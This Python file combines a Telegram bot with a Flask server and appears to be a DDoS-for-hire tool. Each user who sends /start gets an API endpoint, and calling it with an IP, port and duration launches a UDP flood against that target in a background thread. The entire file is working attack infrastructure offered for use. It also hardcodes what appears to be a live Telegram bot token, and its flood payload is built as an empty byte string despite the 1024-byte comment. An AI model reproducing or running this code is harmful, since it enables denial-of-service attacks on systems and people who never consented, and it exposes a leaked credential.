import json
import os
import threading
import socket
import time
from flask import Flask, jsonify, request
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ========== CONFIGURATION ==========
BOT_TOKEN = "8598083994:AAGJiSq9jK-xSGrJCDWMsCVsBMC0kkBodB0"  # <-- Apna bot token yahan daalna
API_PORT = 3001
DATA_FILE = "apis.json"

# ========== FLASK SERVER ==========
app = Flask(__name__)
apis = {}

def load_apis():
    global apis
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            apis = json.load(f)
    else:
        apis = {}
    print("[INFO] Loaded saved APIs:", apis)

def save_apis():
    with open(DATA_FILE, "w") as f:
        json.dump(apis, f, indent=4)

def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = b'' * 1024  # Packet size of 1024 bytes
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (ip, int(port)))
        except Exception:
            pass
    sock.close()

def create_api_route(username, apiname):
    route_path = f"/{apiname}/"

    @app.route(route_path)
    def user_api():
        ip = request.args.get('ip')
        port = request.args.get('port')
        time_s = request.args.get('time')

        if not ip or not port or not time_s:
            return jsonify({"error": "Missing parameter(s). 'ip', 'port', and 'time' are required."}), 400

        try:
            time_int = int(time_s)
        except ValueError:
            return jsonify({"error": "Invalid 'time' parameter. Must be an integer."}), 400

        # Start attack in a background thread so API responds immediately
        threading.Thread(target=udp_flood, args=(ip, port, time_int), daemon=True).start()

        return jsonify({
            "message": f"Attack started on {ip}:{port} for {time_int} seconds by @{username}"
        })

    print(f"[+] API created for {username}: {route_path}")

def restore_routes():
    for user_id, info in apis.items():
        create_api_route(info["username"], info["apiname"])

# ========== TELEGRAM BOT COMMANDS ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    username = user.username or f"user_{user.id}"

    if user_id in apis:
        api_url = apis[user_id]["url"]
        await update.message.reply_text(
            f"👋 Welcome back @{username}!
Your API already exists:

{api_url}

⚠️ 1 user can get only 1 API"
        )
        return

    # Create new API
    apiname = f"api_{user_id}"
    local_ip = os.popen("hostname -I").read().strip().split()[0]
    url = f"http://{local_ip}:{API_PORT}/{apiname}/"

    apis[user_id] = {
        "username": username,
        "apiname": apiname,
        "url": url
    }
    save_apis()
    create_api_route(username, apiname)

    await update.message.reply_text(
        f"✅ API created successfully!

Your API link:
{url}

⚠️ 1 user can get only 1 API"
    )

# ========== MAIN FUNCTIONS ==========

def start_flask():
    restore_routes()
    app.run(host="0.0.0.0", port=API_PORT)

def start_bot():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))

    print("[BOT] Telegram bot running...")
    application.run_polling()

if __name__ == "__main__":
    load_apis()
    threading.Thread(target=start_flask, daemon=True).start()
    start_bot()